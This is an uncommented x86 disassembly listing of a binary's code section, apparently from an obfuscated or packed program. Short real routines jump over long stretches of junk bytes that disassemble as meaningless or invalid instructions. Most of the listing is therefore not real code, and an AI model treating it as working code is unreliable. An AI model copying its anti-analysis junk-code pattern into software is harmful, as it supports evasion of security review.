  40edff:	add    DWORD PTR [eax],ecx
  40ee01:	mov    eax,DWORD PTR [ebp-0x90]
  40ee07:	mov    ecx,DWORD PTR [ebp-0x8c]
  40ee0d:	mov    edx,DWORD PTR [ebp-0xa0]
  40ee13:	mov    esi,DWORD PTR [ebp-0x9c]
  40ee19:	sub    edx,eax
  40ee1b:	mov    eax,DWORD PTR [ebp-0xb0]
  40ee21:	sbb    esi,ecx
  40ee23:	mov    ecx,DWORD PTR [ebp-0xac]
  40ee29:	xor    edx,eax
  40ee2b:	mov    eax,DWORD PTR [ebp-0xc0]
  40ee31:	xor    esi,ecx
  40ee33:	mov    ecx,DWORD PTR [ebp-0xbc]
  40ee39:	add    edx,eax
  40ee3b:	adc    esi,ecx
  40ee3d:	add    edx,0x2313
  40ee43:	adc    esi,0x2a00
  40ee49:	push   esi
  40ee4a:	push   edx
  40ee4b:	call   0x422239
  40ee50:	mov    ecx,0x1207
  40ee55:	sub    ecx,eax
  40ee57:	push   0x0
  40ee59:	pop    eax
  40ee5a:	sbb    eax,edx
  40ee5c:	mov    edx,DWORD PTR ds:0x42274c
  40ee62:	xor    esi,esi
  40ee64:	jmp    0x40f1a7
  40ee69:	mov    bh,0x51
  40ee6b:	lods   eax,DWORD PTR ds:[esi]
  40ee6c:	xchg   edi,eax
  40ee6d:	mov    ebx,0x8571b7bb
  40ee72:	pop    ecx
  40ee73:	xor    ch,bl
  40ee75:	xor    al,0xac
  40ee77:	xlat   BYTE PTR ds:[ebx]
  40ee78:	jecxz  0x40ee67
  40ee7a:	adc    bh,BYTE PTR [esi-0x413bfe42]
  40ee80:	mov    esi,0x941f3f3d
  40ee85:	sti    
  40ee86:	or     eax,0x672333aa
  40ee8b:	daa    
  40ee8c:	leave  
  40ee8d:	cmovge ecx,DWORD PTR [esp+edx*8-0x63]
  40ee92:	or     BYTE PTR [eax],bh
  40ee94:	cmp    al,0x8b
  40ee96:	ins    BYTE PTR es:[edi],dx
  40ee97:	inc    esi
  40ee98:	into   
  40ee99:	lods   eax,DWORD PTR ds:[esi]
  40ee9a:	and    ecx,edi
  40ee9c:	cmp    edi,ecx
  40ee9e:	push   ecx
  40ee9f:	pop    eax
  40eea0:	jge    0x40eecb
  40eea2:	sbb    eax,0x11df2c8e
  40eea7:	mov    ds:0xc44614c,al
  40eeac:	std    
  40eead:	inc    esp
  40eeae:	push   ds
  40eeaf:	cld    
  40eeb0:	hlt    
  40eeb1:	ret    
  40eeb2:	int    0x46
  40eeb4:	push   eax
  40eeb5:	jmp    0x62e9a80f
  40eeba:	sub    DWORD PTR [ebx+0x4b1704aa],ebx
  40eec0:	or     al,0xa6
  40eec2:	jb     0x40ef21
  40eec4:	or     esi,DWORD PTR [ebp+eiz*8-0x20]
  40eec8:	or     BYTE PTR [ebx+0x38],ch
  40eecb:	(bad)  [edi-0x5f]
  40eece:	cld    
  40eecf:	mov    bh,0x86
  40eed1:	sbb    esi,DWORD PTR [ebx-0x17]
  40eed4:	push   edi
  40eed5:	pop    ds
  40eed6:	push   ebp
  40eed7:	jno    0x40ee5e
  40eed9:	dec    edx
  40eeda:	stos   BYTE PTR es:[edi],al
  40eedb:	inc    eax
  40eedc:	or     al,0xd7
  40eede:	or     DWORD PTR [esi-0xbc54fcc],0x52
  40eee5:	mov    WORD PTR [edi],ds
  40eee7:	retf   
  40eee8:	xor    ebp,esp
  40eeea:	cld    
  40eeeb:	sbb    BYTE PTR [ebx],cl
  40eeed:	xchg   BYTE PTR [esi-0x77fb5e7b],bl
  40eef3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eef4:	cmp    edx,DWORD PTR [eax-0x7a5e4fda]
  40eefa:	add    BYTE PTR [ebx+0x49],ah
  40eefd:	fldenv ds:0xe9e800ca
  40ef03:	gs adc al,al
  40ef06:	js     0x40eeed
  40ef08:	or     al,BYTE PTR [edi+0x14]
  40ef0b:	xchg   esp,eax
  40ef0c:	data16 jns 0x40ef1e
  40ef0f:	or     DWORD PTR [eax-0x7f14c93c],eax
  40ef15:	jl     0x40ef77
  40ef17:	jb     0x40eef5
  40ef19:	jl     0x40ef61
  40ef1b:	xchg   edx,eax
  40ef1c:	and    edi,edx
  40ef1e:	shr    ch,1
  40ef20:	pop    es
  40ef21:	dec    ebx
  40ef22:	jne    0x40ef1d
  40ef24:	adc    DWORD PTR [ecx],ecx
  40ef26:	scas   eax,DWORD PTR es:[edi]
  40ef27:	mov    WORD PTR [ebx+0x40],ss
  40ef2a:	cld    
  40ef2b:	xor    al,0x15
  40ef2d:	(bad)  
  40ef2e:	je     0x40ef55
  40ef30:	push   ebx
  40ef31:	jno    0x40eec7
  40ef33:	stos   DWORD PTR es:[edi],eax
  40ef34:	add    eax,0xfb9e0457
  40ef39:	push   cs
  40ef3a:	jae    0x40ef9a
  40ef3c:	pop    edi
  40ef3d:	call   0xd63134c9
  40ef42:	cwde   
  40ef43:	sti    
  40ef44:	iret   
  40ef45:	pop    esp
  40ef46:	inc    eax
  40ef47:	push   0xfb57fedc
  40ef4c:	add    ebp,DWORD PTR [eax-0x7d7c7005]
  40ef52:	jnp    0x40ef30
  40ef54:	sbb    dh,al
  40ef56:	shl    BYTE PTR [esi],0x54
  40ef59:	sbb    al,al
  40ef5b:	mov    ch,0xb4
  40ef5d:	je     0x40ef55
  40ef5f:	mov    ss,edi
  40ef61:	loope  0x40ef72
  40ef63:	ficom  WORD PTR ds:0xc81e2c78
  40ef69:	dec    eax
  40ef6a:	cmp    eax,DWORD PTR [edx+ebx*2+0x42]
  40ef6e:	adc    al,bl
  40ef70:	call   DWORD PTR [eax-0x6a7909db]
  40ef76:	arpl   WORD PTR [esi-0x12e59f40],sp
  40ef7c:	out    dx,al
  40ef7d:	pop    fs
  40ef7f:	popa   
  40ef80:	add    al,0xe2
  40ef82:	adc    esi,eax
  40ef84:	pushf  
  40ef85:	mov    al,0x18
  40ef87:	fistp  QWORD PTR [ecx+0x2d438218]
  40ef8d:	mov    cl,0x5f
  40ef8f:	push   edi
  40ef90:	test   DWORD PTR [esi-0x7339546c],0x6e3f810f
  40ef9a:	pop    es
  40ef9b:	sbb    ebx,edx
  40ef9d:	inc    edx
  40ef9e:	sbb    dh,bh
  40efa0:	mov    ds,WORD PTR [edi]
  40efa2:	mov    eax,ds:0x95932d9e
  40efa7:	imul   BYTE PTR [eax-0x666f0377]
  40efad:	xlat   BYTE PTR ds:[ebx]
  40efae:	outs   dx,BYTE PTR ds:[esi]
  40efaf:	adc    edx,DWORD PTR [ecx]
  40efb1:	pop    eax
  40efb2:	(bad)  
  40efb3:	iret   
  40efb4:	jns    0x40efea
  40efb6:	fnstcw WORD PTR [esi]
  40efb8:	je     0x40efa3
  40efba:	cmp    ebx,DWORD PTR [ebx+0x6412b54a]
  40efc0:	adc    al,BYTE PTR [edx+0x4e]
  40efc3:	popf   
  40efc4:	pop    edx
  40efc5:	add    eax,0xe0f73773
  40efca:	(bad)  
  40efcb:	rcr    DWORD PTR [edi+0x27b5742a],cl
  40efd1:	imul   esi,DWORD PTR [eax-0x67bb60a9],0x8b2a6a0c
  40efdb:	adc    ah,BYTE PTR [edi-0x2d40723f]
  40efe1:	push   ebp
  40efe2:	scas   eax,DWORD PTR es:[edi]
  40efe3:	sub    al,0x63
  40efe5:	sbb    al,ah
  40efe7:	dec    eax
  40efe8:	in     al,dx
  40efe9:	in     al,0x91
  40efeb:	xchg   ecx,eax
  40efec:	push   edi
  40efed:	sbb    DWORD PTR [ebp-0x17],esp
  40eff0:	test   eax,0xf9a9e34e
  40eff5:	jmp    DWORD PTR [esi+eiz*8]
  40eff8:	push   edx
  40eff9:	mov    ebx,0x3937fbe4
  40effe:	dec    ecx
  40efff:	adc    al,0x4a
  40f001:	loope  0x40f00c
  40f003:	mov    al,0x5f
  40f005:	sbb    eax,0xa144827e
  40f00a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f00b:	cmp    al,0xce
  40f00d:	mov    ebp,0xf8584a7
  40f012:	adc    eax,0xebe56f82
  40f017:	ss jno 0x40f084
  40f01a:	push   ss
  40f01b:	loope  0x40f09a
  40f01d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f01e:	iret   
  40f01f:	jl     0x40f090
  40f021:	adc    DWORD PTR [esi+0x7f1ddb39],eax
  40f027:	pop    ds
  40f028:	xchg   BYTE PTR [edx],ah
  40f02a:	mov    eax,ds:0xbbcece15
  40f02f:	lods   eax,DWORD PTR ds:[esi]
  40f030:	test   BYTE PTR [edx+0x35],0xa2
  40f034:	dec    esi
  40f035:	or     esp,ebp
  40f037:	arpl   di,cx
  40f039:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f03a:	mov    al,ds:0x210bf502
  40f03f:	aad    0x79
  40f041:	std    
  40f042:	cmp    edi,ebp
  40f044:	ficomp WORD PTR [ebx+0x8]
  40f047:	or     al,0xb
  40f049:	(bad)  
  40f04a:	fs pop ebx
  40f04c:	adc    eax,0x4eba5760
  40f051:	lods   eax,DWORD PTR ds:[esi]
  40f052:	mov    BYTE PTR ds:0xdcfa258f,bl
  40f058:	push   esi
  40f059:	pop    edi
  40f05a:	lea    ecx,[edi-0x35]
  40f05d:	jg     0x40f034
  40f05f:	es jmp 0x33decb62
  40f065:	adc    al,0xd3
  40f067:	xchg   BYTE PTR [esp+ebp*1+0x74f01db6],bh
  40f06e:	sub    ch,BYTE PTR [esi-0x30661493]
  40f074:	sbb    DWORD PTR [edi],0xffffffcf
  40f077:	sti    
  40f078:	mov    BYTE PTR [ebx+0x1fa430f6],al
  40f07e:	div    DWORD PTR [edx+edx*8+0x3278ad65]
  40f085:	or     dh,0xcf
  40f088:	pop    eax
  40f089:	lods   eax,DWORD PTR ds:[esi]
  40f08a:	scas   eax,DWORD PTR es:[edi]
  40f08b:	popa   
  40f08c:	dec    ax
  40f08e:	in     al,0xad
  40f090:	pop    ecx
  40f091:	mov    esi,0x9e9711f5
  40f096:	sbb    BYTE PTR [edi-0x94424e5],0xf4
  40f09d:	test   eax,0x1bf4ddb0
  40f0a2:	sub    BYTE PTR [ecx+0x12],ah
  40f0a5:	aad    0x98
  40f0a7:	push   esp
  40f0a8:	xor    eax,0x11cef388
  40f0ad:	jns    0x40f0e2
  40f0af:	scas   al,BYTE PTR es:[edi]
  40f0b0:	ret    
  40f0b1:	mov    WORD PTR [edi+0x62],?
  40f0b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f0b5:	jno    0x40f0c8
  40f0b7:	jne    0x40f0c5
  40f0b9:	sahf   
  40f0ba:	test   ebx,0x749eca37
  40f0c0:	push   esp
  40f0c1:	mov    al,0x80
  40f0c3:	xchg   BYTE PTR [esi+0x93c2b64],ch
  40f0c9:	shl    bl,1
  40f0cb:	adc    dl,ch
  40f0cd:	cmp    eax,0x972945e9
  40f0d2:	mov    ch,BYTE PTR [ecx]
  40f0d4:	(bad)  
  40f0d5:	outs   dx,DWORD PTR ds:[esi]
  40f0d6:	cmp    BYTE PTR [ebx+0x6a],bh
  40f0d9:	push   ecx
  40f0da:	or     BYTE PTR [ebp-0x6a],0x5
  40f0de:	inc    edx
  40f0df:	cmp    dh,BYTE PTR [ebp-0x46]
  40f0e2:	mov    eax,0xcfba30f3
  40f0e7:	cmp    BYTE PTR [edx],bl
  40f0e9:	fwait
  40f0ea:	sbb    eax,0x82d31383
  40f0ef:	jge    0x40f123
  40f0f1:	jmp    0x40f090
  40f0f3:	idiv   DWORD PTR [edi-0x3b85b87e]
  40f0f9:	loopne 0x40f107
  40f0fb:	in     eax,dx
  40f0fc:	enter  0xdabd,0x63
  40f100:	mov    bl,0x60
  40f102:	xchg   BYTE PTR [ebp-0x38],dl
  40f105:	ja     0x40f0db
  40f107:	adc    BYTE PTR [ebx+0x4604bbd8],ch
  40f10d:	mov    esi,0x48475609
  40f112:	imul   esi,DWORD PTR [ebx],0x29a9ccc1
  40f118:	xlat   BYTE PTR ds:[ebx]
  40f119:	rol    edx,cl
  40f11b:	call   0x99976b26
  40f120:	retf   
  40f121:	imul   esi,DWORD PTR [edx+0x3bba14d3],0xc664c8b6
  40f12b:	mov    ecx,0xc45f822c
  40f130:	inc    esp
  40f131:	pop    es
  40f132:	inc    esp
  40f133:	mov    edi,0x44fed587
  40f138:	(bad)  
  40f139:	xor    bl,BYTE PTR [ebp-0x38ab0690]
  40f13f:	sbb    BYTE PTR [esi],al
  40f141:	sbb    eax,0x96652c04
  40f146:	jb     0x40f163
  40f148:	mov    ebx,0x55da25f1
  40f14d:	call   0x59ac1d30
  40f152:	in     eax,0xc4
  40f154:	(bad)  
  40f155:	(bad)  [esp+eax*4-0x7d850c6a]
  40f15c:	xchg   ecx,eax
  40f15d:	cmp    cl,BYTE PTR [esi+0x4c]
  40f160:	and    ah,BYTE PTR [esi+0x3ae8c36e]
  40f166:	leave  
  40f167:	pop    ebp
  40f168:	lods   al,BYTE PTR ds:[esi]
  40f169:	and    al,0xa6
  40f16b:	call   0xae54:0xa27bf439
  40f172:	sbb    bh,dh
  40f174:	js     0x40f1c7
  40f176:	xchg   ah,dl
  40f178:	pop    ecx
  40f17a:	sar    DWORD PTR [edx+0x35f2f760],cl
  40f180:	daa    
  40f181:	in     al,dx
  40f182:	fcom   QWORD PTR [esi+eax*8]
  40f185:	mov    esp,0xefe091ba
  40f18a:	adc    al,0x91
  40f18c:	pop    es
  40f18d:	loop   0x40f17c
  40f18f:	test   BYTE PTR [edx-0x68fd34cb],dl
  40f195:	and    al,0xb2
  40f197:	rol    esp,0x17
  40f19a:	mov    edx,0xac81c0b0
  40f19f:	sub    DWORD PTR [eax+eax*2],edi
  40f1a2:	rcl    BYTE PTR [ecx-0x3a],0xba
  40f1a6:	xor    al,0x3b
  40f1a8:	ror    DWORD PTR [edi],1
  40f1aa:	test   DWORD PTR ds:0x3b000000,ebp
  40f1b0:	lock jne 0x40f1dc
  40f1b7:	mov    eax,DWORD PTR [ebp-0x4]
  40f1ba:	mov    ecx,DWORD PTR [ebp-0x8]
  40f1bd:	add    eax,0x4296
  40f1c2:	shr    eax,0x2
  40f1c5:	or     eax,ecx
  40f1c7:	mov    ecx,DWORD PTR [ebp-0x10]
  40f1ca:	xor    eax,ecx
  40f1cc:	xor    eax,0x4e94
  40f1d1:	add    eax,DWORD PTR ds:0x42274c
  40f1d7:	mov    ds:0x422754,eax
  40f1dc:	pop    esi
  40f1dd:	leave  
  40f1de:	ret    0x4
  40f1e1:	push   ebp
  40f1e2:	mov    ebp,esp
  40f1e4:	sub    esp,0x58
  40f1e7:	push   ebx
  40f1e8:	push   esi
  40f1e9:	jmp    0x40f59d
  40f1ee:	jne    0x40f25e
  40f1f0:	mov    ds:0xb73caafc,al
  40f1f5:	je     0x40f1e5
  40f1f7:	fsubr  QWORD PTR [ecx+edx*8-0x73]
  40f1fb:	or     eax,DWORD PTR [edx-0x23]
  40f1fe:	xor    DWORD PTR [eax],ebx
  40f200:	mov    esi,0xbec4e3be
  40f205:	mov    esi,0x8adac2d6
  40f20a:	test   BYTE PTR [edi-0x3c80b472],0xa5
  40f211:	inc    ebp
  40f212:	dec    esp
  40f213:	sbb    BYTE PTR [eax],ch
  40f215:	push   cs
  40f216:	mov    eax,ds:0xfe696444
  40f21b:	pop    ecx
  40f21c:	in     al,dx
  40f21d:	xor    al,0x69
  40f220:	fdivr  QWORD PTR [edi]
  40f222:	mov    al,0x7c
  40f224:	jmp    0x2883:0xc44ce285
  40f22b:	mov    es,WORD PTR [edi+0x21560780]
  40f231:	dec    ebp
  40f232:	jae    0x40f268
  40f234:	xlat   BYTE PTR ds:[ebx]
  40f235:	shl    BYTE PTR [esi+0x3c],0x39
  40f239:	out    dx,eax
  40f23a:	cs in  eax,0xe0
  40f23d:	sti    
  40f23e:	ja     0x40f226
  40f240:	cmp    eax,0x54d3566e
  40f245:	(bad)  
  40f246:	mov    edi,0xbcdde412
  40f24b:	cmp    ah,BYTE PTR [esi-0x6]
  40f24e:	mov    BYTE PTR [edx-0x57],dh
  40f251:	daa    
  40f252:	cld    
  40f253:	xor    edx,DWORD PTR [ebp-0x4136cd8e]
  40f259:	dec    edx
  40f25a:	mov    BYTE PTR [edx-0x29e9281f],dh
  40f260:	loopne 0x40f2e0
  40f262:	add    eax,0x89a674cf
  40f267:	sub    BYTE PTR [edx-0x7779a511],ah
  40f26d:	add    BYTE PTR [esi+0x7ee2f646],0x6f
  40f274:	mov    gs,WORD PTR [edx-0x265716a]
  40f27a:	mov    ?,WORD PTR ds:[edx+0x31]
  40f27e:	inc    edx
  40f27f:	mov    edi,0xce25361d
  40f284:	sub    BYTE PTR [edx],cl
  40f286:	fbstp  TBYTE PTR [edx+0x30c7c014]
  40f28c:	push   dx
  40f28e:	inc    esi
  40f28f:	mov    WORD PTR [ebp+0x775274dc],gs
  40f295:	in     al,dx
  40f296:	mov    cl,0x12
  40f298:	cmp    eax,0xb936bf49
  40f29d:	fs (bad) 
  40f29f:	es inc edi
  40f2a1:	std    
  40f2a2:	or     dl,BYTE PTR [ebx]
  40f2a4:	repz or eax,0x72883932
  40f2aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f2ab:	or     DWORD PTR [ecx+0x24a60e06],ecx
  40f2b1:	push   ebx
  40f2b2:	jb     0x40f30e
  40f2b4:	aaa    
  40f2b5:	dec    ebx
  40f2b6:	lahf   
  40f2b7:	(bad)  
  40f2b8:	lds    esp,FWORD PTR [ebp+0x14]
  40f2bb:	or     BYTE PTR [esp+esi*4+0x2c0cc466],0x81
  40f2c3:	xchg   ecx,eax
  40f2c4:	bnd jne 0x40f2b7
  40f2c7:	and    DWORD PTR [eax-0x9],edi
  40f2ca:	inc    eax
  40f2cb:	(bad)  
  40f2cc:	cmc    
  40f2cd:	popf   
  40f2ce:	xchg   ebx,eax
  40f2cf:	or     BYTE PTR [ecx+0x15ad313a],al
  40f2d5:	and    al,0xde
  40f2d7:	jbe    0x40f312
  40f2d9:	lds    esp,FWORD PTR [ecx+0x69]
  40f2dc:	outs   dx,DWORD PTR ds:[esi]
  40f2dd:	cmp    bl,bh
  40f2df:	sub    BYTE PTR cs:[ebx+ebx*1-0x462a36d9],ah
  40f2e7:	mov    eax,eax
  40f2e9:	xor    BYTE PTR [eax+0xc836489],dl
  40f2ef:	add    DWORD PTR [eax],0x15
  40f2f2:	push   eax
  40f2f3:	popa   
  40f2f4:	mov    bl,0xc4
  40f2f6:	mov    eax,0xf426bccf
  40f2fb:	or     ch,bh
  40f2fd:	push   edi
  40f2fe:	or     bh,0x5d
  40f301:	xor    edx,DWORD PTR [ebx+0x484a5a96]
  40f307:	cmp    eax,0xbee97a85
  40f30c:	mov    bl,0x6b
  40f30e:	mov    ds:0xfd9e8345,eax
  40f313:	push   0x79
  40f315:	add    BYTE PTR [ebx+0x462f339a],0xf
  40f31c:	out    dx,eax
  40f31d:	mov    ds:0xd96540a,eax
  40f322:	cwde   
  40f323:	es nop
  40f325:	jl     0x40f2b6
  40f327:	inc    eax
  40f328:	jmp    0xfa298b1f
  40f32d:	outs   dx,BYTE PTR ds:[esi]
  40f32e:	jmp    0xacca787
  40f333:	mov    esp,0x97004780
  40f338:	les    ebp,FWORD PTR [esi-0x59fa7d4e]
  40f33e:	adc    edx,DWORD PTR [edx]
  40f340:	ret    0xcd45
  40f343:	bound  edx,QWORD PTR [ebp-0x10e67701]
  40f349:	push   ds
  40f34a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f34b:	sub    esi,0x8a8a95d
  40f351:	mov    al,ds:0xe521904d
  40f356:	jb     0x40f3c3
  40f358:	fidiv  DWORD PTR [ebx]
  40f35a:	mov    esi,0x8220c7f3
  40f35f:	and    edi,edx
  40f361:	in     eax,0xc6
  40f363:	push   ds
  40f364:	scas   al,BYTE PTR es:[edi]
  40f365:	mov    ecx,0xf9dc5d29
  40f36a:	stos   DWORD PTR es:[edi],eax
  40f36b:	mov    ch,0x8e
  40f36d:	adc    al,al
  40f36f:	test   eax,0x70615e8d
  40f374:	inc    ebp
  40f375:	cmp    eax,0x83e7a72e
  40f37a:	js     0x40f3f2
  40f37c:	rcr    BYTE PTR [edi],0x50
  40f37f:	push   ss
  40f380:	out    0x22,al
  40f382:	pop    esi
  40f383:	aam    0xe8
  40f385:	mov    bl,0xfb
  40f387:	out    dx,al
  40f388:	bound  edi,QWORD PTR [ebx+0x366a018e]
  40f38e:	fwait
  40f38f:	enter  0x67df,0x92
  40f393:	imul   eax,DWORD PTR [eax-0x31725f1c],0xa1b81cd3
  40f39d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f39e:	add    DWORD PTR [ecx+0x73],0x2
  40f3a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f3a3:	popf   
  40f3a4:	mov    edx,0xfd5cc937
  40f3a9:	dec    esi
  40f3aa:	fucomip st,st(4)
  40f3ac:	cmc    
  40f3ad:	mov    eax,0xfb180e96
  40f3b2:	sbb    al,0x5e
  40f3b4:	inc    eax
  40f3b5:	retf   
  40f3b6:	mov    edi,0x4b059389
  40f3bb:	add    ch,cl
  40f3bd:	mov    esp,0x6f990136
  40f3c2:	test   al,0xc1
  40f3c4:	pop    ds
  40f3c5:	call   0xd364:0xe8316e65
  40f3cc:	or     eax,0x9e7dbfee
  40f3d1:	inc    edi
  40f3d2:	stc    
  40f3d3:	cdq    
  40f3d4:	jle    0x40f3af
  40f3d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f3d7:	mov    ebx,0xdf557513
  40f3dc:	mov    al,0x16
  40f3de:	ins    BYTE PTR es:[edi],dx
  40f3df:	sub    eax,0x1a4fc2ac
  40f3e4:	add    eax,0xdff4c9f6
  40f3e9:	inc    eax
  40f3ea:	dec    esi
  40f3eb:	push   cs
  40f3ec:	xor    dl,BYTE PTR [edx+0x7f]
  40f3ef:	sub    al,0xb9
  40f3f1:	in     al,0xdf
  40f3f3:	and    eax,0x68fa51ea
  40f3f8:	push   ebx
  40f3f9:	adc    al,BYTE PTR [esp+ecx*8-0x4775f587]
  40f400:	sub    eax,0x467c630b
  40f405:	or     eax,0xca1c37e6
  40f40a:	pushf  
  40f40b:	out    dx,al
  40f40c:	mov    BYTE PTR [ecx],bh
  40f40e:	mov    DWORD PTR [eax+eax*2-0x5],0xbabf153e
  40f416:	icebp  
  40f417:	repz sub DWORD PTR [ebx-0x7a],ecx
  40f41b:	shl    BYTE PTR [esi],0x30
  40f41e:	into   
  40f41f:	or     BYTE PTR [ebx],al
  40f421:	xor    al,0x88
  40f423:	xchg   esi,eax
  40f424:	test   DWORD PTR [ebx-0x3f],esi
  40f427:	in     al,dx
  40f428:	dec    edi
  40f429:	sahf   
  40f42a:	in     al,dx
  40f42b:	sub    DWORD PTR [edi+0x1],ebx
  40f42e:	jecxz  0x40f47f
  40f430:	stos   DWORD PTR es:[edi],eax
  40f431:	push   edi
  40f432:	mov    esi,0xc4e9ac58
  40f437:	rep stos DWORD PTR es:[edi],eax
  40f439:	adc    DWORD PTR [ecx],edi
  40f43b:	pop    esi
  40f43c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f43d:	stos   DWORD PTR es:[edi],eax
  40f43e:	mov    cl,0x3b
  40f440:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f441:	or     al,0x71
  40f443:	jecxz  0x40f457
  40f445:	ss js  0x40f3e5
  40f448:	dec    edi
  40f449:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f44a:	(bad)  
  40f44c:	repz cwde 
  40f44e:	(bad)  
  40f44f:	js     0x40f475
  40f451:	sub    al,0xc8
  40f453:	stos   DWORD PTR es:[edi],eax
  40f454:	sub    al,0xef
  40f456:	or     BYTE PTR [ebx+0x59c67921],ah
  40f45c:	xor    al,0xf6
  40f45e:	ret    
  40f45f:	fimul  DWORD PTR [esi+edi*4+0x596e204b]
  40f466:	pop    eax
  40f467:	fnstsw ax
  40f469:	dec    eax
  40f46a:	mov    ds:0xa3a0a4d2,al
  40f46f:	mov    esp,0x2af57c56
  40f474:	jl     0x40f4e8
  40f476:	xchg   edi,eax
  40f477:	or     BYTE PTR [esi-0x79],cl
  40f47a:	mov    cl,0xd7
  40f47c:	neg    BYTE PTR [ecx+0x27]
  40f47f:	cmp    al,0xd8
  40f481:	xor    edx,ecx
  40f483:	add    al,0xdc
  40f485:	in     eax,0xc1
  40f487:	rol    BYTE PTR [eax],0x92
  40f48a:	icebp  
  40f48b:	pushf  
  40f48c:	jae    0x40f4a0
  40f48e:	ss cwde 
  40f490:	sub    BYTE PTR [ecx],0xfb
  40f493:	mov    esi,0x1473baca
  40f498:	or     DWORD PTR [eax+esi*1],ebx
  40f49b:	ds and ah,ah
  40f49e:	xor    eax,0xfcb7ae61
  40f4a3:	push   edx
  40f4a4:	pop    ebx
  40f4a5:	jnp    0x40f442
  40f4a7:	les    esi,FWORD PTR [ebp+0x2e]
  40f4aa:	(bad)  
  40f4ab:	fcmove st,st(7)
  40f4ad:	mov    WORD PTR [edx+0x567470f3],es
  40f4b3:	add    ebp,edx
  40f4b5:	js     0x40f4ba
  40f4b7:	adc    al,0x18
  40f4b9:	nop
  40f4ba:	and    al,0x65
  40f4bc:	retf   0x430c
  40f4bf:	outs   dx,DWORD PTR ds:[esi]
  40f4c0:	pop    es
  40f4c1:	mov    edi,0x699b1b62
  40f4c6:	xor    eax,0xa2b4cbb0
  40f4cb:	jmp    0x8d41:0x53bd2365
  40f4d2:	scas   eax,DWORD PTR es:[edi]
  40f4d3:	std    
  40f4d4:	sub    DWORD PTR [ebp-0x13935b71],esi
  40f4da:	pop    edi
  40f4db:	or     eax,edx
  40f4dd:	inc    ebp
  40f4de:	dec    ebp
  40f4df:	mov    ds:0x3faf000a,eax
  40f4e4:	popa   
  40f4e5:	push   0xffffffba
  40f4e7:	enter  0xa292,0x7e
  40f4eb:	jns    0x40f50a
  40f4ed:	xchg   ecx,eax
  40f4ee:	add    DWORD PTR [edx+0x47dd4e61],esi
  40f4f4:	adc    dh,BYTE PTR [ebx-0x3f]
  40f4f7:	jno    0x40f56e
  40f4f9:	fwait
  40f4fa:	adc    eax,esp
  40f4fc:	aas    
  40f4fd:	mov    eax,0xeac9d418
  40f502:	mov    dh,0x1
  40f504:	adc    al,0xb0
  40f506:	inc    ebx
  40f507:	mov    ebx,0xfc8aa162
  40f50c:	add    dh,ch
  40f50e:	data16 sbb dl,al
  40f511:	adc    esi,DWORD PTR [ecx]
  40f513:	call   DWORD PTR [esi]
  40f515:	loope  0x40f4c5
  40f517:	movmskps eax,xmm1
  40f51a:	lock out 0x23,eax
  40f51d:	and    ch,bh
  40f51f:	pop    ebx
  40f520:	xor    edx,DWORD PTR [ebx]
  40f522:	out    dx,al
  40f523:	sbb    eax,0xb6803f2b
  40f528:	setbe  bh
  40f52b:	jo     0x40f554
  40f52d:	jb     0x40f517
  40f52f:	or     eax,DWORD PTR [edx+esi*1+0x1c4eb1ce]
  40f536:	ins    BYTE PTR es:[edi],dx
  40f537:	push   ss
  40f538:	cmc    
  40f539:	cdq    
  40f53a:	jns    0x40f515
  40f53c:	add    eax,0xbd67f483
  40f541:	jno    0x40f55f
  40f543:	jle    0x40f4ea
  40f545:	push   ebx
  40f546:	inc    ebp
  40f547:	jnp    0x40f58b
  40f549:	sub    al,0xdc
  40f54b:	enter  0xda89,0x38
  40f54f:	add    al,0xed
  40f551:	push   es
  40f552:	loope  0x40f577
  40f554:	mov    BYTE PTR [edi+0x60958b7a],0xad
  40f55b:	dec    ebp
  40f55c:	or     BYTE PTR [eax-0x4c],bh
  40f55f:	out    0xc8,eax
  40f561:	in     eax,dx
  40f562:	dec    ebp
  40f563:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f564:	pop    edx
  40f565:	xchg   DWORD PTR [eax],edx
  40f567:	mov    edx,0x81f888e5
  40f56c:	sub    BYTE PTR [ebx-0x6f],al
  40f56f:	push   edx
  40f570:	pop    esp
  40f571:	dec    edx
  40f572:	mov    ebp,0x3c9b38d7
  40f577:	loopne 0x40f598
  40f579:	das    
  40f57a:	dec    ebx
  40f57b:	arpl   WORD PTR [eax],cx
  40f57d:	retf   
  40f57e:	add    eax,0xc434396f
  40f583:	and    BYTE PTR [esi-0x5c12698],al
  40f589:	xchg   ecx,eax
  40f58a:	and    DWORD PTR [ebx-0x45ad492f],edi
  40f590:	xchg   DWORD PTR [ebx+ebx*8],esi
  40f593:	and    DWORD PTR [ebx-0x54],ebx
  40f596:	dec    edx
  40f597:	xor    al,0xc2
  40f599:	add    eax,DWORD PTR [ecx+0x76]
  40f59c:	pop    ds
  40f59d:	push   edi
  40f59e:	mov    DWORD PTR [ebp-0x58],0x3082
  40f5a5:	mov    DWORD PTR [ebp-0x54],0x37a2
  40f5ac:	mov    DWORD PTR [ebp-0x50],0x49d6
  40f5b3:	mov    DWORD PTR [ebp-0x4c],0x6390
  40f5ba:	mov    DWORD PTR [ebp-0x48],0x40f2
  40f5c1:	mov    DWORD PTR [ebp-0x44],0x21d4
  40f5c8:	mov    DWORD PTR [ebp-0x28],0x4726
  40f5cf:	mov    DWORD PTR [ebp-0x24],0x221a
  40f5d6:	mov    DWORD PTR [ebp-0x30],0x768c
  40f5dd:	mov    DWORD PTR [ebp-0x2c],0x29e8
  40f5e4:	mov    DWORD PTR [ebp-0x40],0x6cf6
  40f5eb:	mov    DWORD PTR [ebp-0x3c],0x94c
  40f5f2:	mov    DWORD PTR [ebp-0x38],0x4797
  40f5f9:	mov    DWORD PTR [ebp-0x34],0x4439
  40f600:	mov    DWORD PTR [ebp-0x20],0x2531
  40f607:	mov    esi,0x5a3e
